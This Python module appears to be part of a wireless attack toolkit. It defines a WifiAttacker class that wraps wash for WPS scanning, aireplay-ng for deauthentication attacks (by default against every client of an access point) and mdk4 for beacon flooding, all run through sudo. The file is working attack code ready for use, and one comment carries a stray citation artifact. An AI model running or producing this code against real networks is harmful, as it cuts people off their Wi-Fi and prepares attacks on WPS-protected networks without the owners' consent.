from core.event_bus import EventBus
from core.logger import get_logger
import subprocess
import time
import os
import signal

log = get_logger("wifi.attacker")
bus = EventBus()

class WifiAttacker:
    def __init__(self, interface='wlan1'):
        self.interface = interface

    def wps_scan(self) -> list:
        log.info(f"Iniciando WPS scan en tiempo real sobre {self.interface}...")
        redes = {}  # Diccionario para evitar duplicados por BSSID

        try:
            # Iniciamos wash como un proceso hijo. 
            # Usamos -s (escaneo pasivo) para mayor compatibilidad.
            proc = subprocess.Popen(
                ['sudo', 'wash', '-i', self.interface, '--scan', '-s'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid  # Necesario para poder matar el proceso sudo después
            )

            start_time = time.time()
            timeout = 45  # Tiempo de escucha en segundos

            while time.time() - start_time < timeout:
                # Leer línea por línea lo que wash imprime en la terminal
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break
                
                parts = line.strip().split()
                
                # Validamos que la línea tenga el formato de una red encontrada
                # Formato típico: BSSID CH RSSI WPS Locked ESSID
                if len(parts) >= 6 and ':' in parts[0] and parts[0] != 'BSSID':
                    bssid = parts[0]
                    redes[bssid] = {
                        'bssid':   bssid,
                        'channel': parts[1],
                        'rssi':    parts[2],
                        'wps_ver': parts[3],
                        'locked':  'Yes' in parts[4],
                        'ssid':    ' '.join(parts[5:]) if len(parts) > 5 else "Unknown",
                    }

            # Terminamos el proceso wash de forma segura
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except ProcessLookupError:
                pass

            lista_redes = list(redes.values())
            log.info(f"WPS scan completo: {len(lista_redes)} redes encontradas")
            
            # Notificar al sistema de eventos [cite: 50, 59]
            bus.publish_sync('wifi.wps_scan_done', {'redes': lista_redes})
            return lista_redes

        except Exception as e:
            log.error(f"Error en escaneo WPS: {e}")
            return []

    def deauth(self, bssid: str, client: str = 'FF:FF:FF:FF:FF:FF', count: int = 10):
        log.warning(f"Deauth → AP:{bssid} Cliente:{client} Count:{count}")
        try:
            result = subprocess.run(
                ['sudo', 'aireplay-ng', '--deauth', str(count),
                 '-a', bssid, '-c', client, self.interface],
                capture_output=True, text=True, timeout=30
            )
            success = result.returncode == 0
            bus.publish_sync('wifi.deauth_sent', {
                'bssid': bssid, 'client': client,
                'count': count, 'success': success,
            })
            return success
        except Exception as e:
            log.error(f"Deauth error: {e}")
            return False

    def beacon_flood(self, ssid: str):
        log.warning(f"Beacon flood → SSID:{ssid}")
        try:
            with open('/tmp/ssid_list.txt', 'w') as f:
                f.write(f"{ssid}\n")
            result = subprocess.run(
                ['sudo', 'mdk4', self.interface, 'b',
                 '-f', '/tmp/ssid_list.txt', '-c', '6'],
                capture_output=True, text=True, timeout=15
            )
            success = result.returncode == 0
            bus.publish_sync('wifi.beacon_flood_sent', {'ssid': ssid, 'success': success})
            return success
        except FileNotFoundError:
            log.error("mdk4 no instalado — sudo apt install mdk4 ")
            return False
        except Exception as e:
            log.error(f"Beacon flood error: {e}")
            return False
